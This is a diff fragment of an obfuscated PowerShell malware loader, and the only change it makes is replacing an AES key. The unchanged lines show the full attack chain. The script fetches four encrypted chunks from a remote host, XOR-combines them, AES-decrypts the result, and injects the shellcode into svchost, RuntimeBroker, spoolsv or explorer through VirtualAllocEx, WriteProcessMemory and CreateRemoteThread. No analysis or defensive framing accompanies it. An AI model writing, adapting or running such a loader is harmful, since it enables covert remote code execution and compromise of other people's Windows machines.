@@ -19,7 +19,7 @@ if($ExecutionContext.SessionState.LanguageMode-eq'ConstrainedLanguage'){try{$r=[
 $ch=@()
 for($ci=0;$ci-lt4;$ci++){try{$c=([Net.WebClient]::new()).DownloadData("$b/c$ci")}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',"$b/c$ci",0);$w.Send();$c=[byte[]]$w.ResponseBody};$ch+=$c}
 $xr=[byte[]]$ch[0].Clone();for($ci=1;$ci-lt$ch.Count;$ci++){for($cj=0;$cj-lt$xr.Length;$cj++){$xr[$cj]=$xr[$cj]-bxor$ch[$ci][$cj]}}
-$ak=[Byte[]]@(0xe9,0x86,0xe8,0xf7,0x97,0xb5,0x0a,0x0f,0xfe,0x15,0x9a,0x7e,0x73,0x8f,0xa3,0xdf)
+$ak=[Byte[]]@(0xdb,0xa5,0x7b,0xa0,0xd9,0x1e,0x05,0x3e,0xfa,0x43,0x32,0xa0,0xed,0x94,0xdd,0xbe)
 $iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
 if([Environment]::Is64BitOperatingSystem-and![Environment]::Is64BitProcess){$_tg=gps|?{$_.Name-in('svchost','RuntimeBroker','spoolsv')}|sort vm|select -F 1}else{$_tg=gps explorer|select -F 1}
 if($_tg){$_ph=[K]::OpenProcess(0x1F0FFF,0,$_tg.Id);$_va=[K]::VirtualAllocEx($_ph,0,$py.Length,0x3000,0x40);$_nw=0;[K]::WriteProcessMemory($_ph,$_va,$py,$py.Length,[ref]$_nw);[K]::CreateRemoteThread($_ph,0,0,$_va,0,0,0);[K]::CloseHandle($_ph)}else{$_va=[K]::VirtualAlloc(0,$py.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($py,0,$_va,$py.Length);[K]::CreateThread(0,0,$_va,0,0,0)}
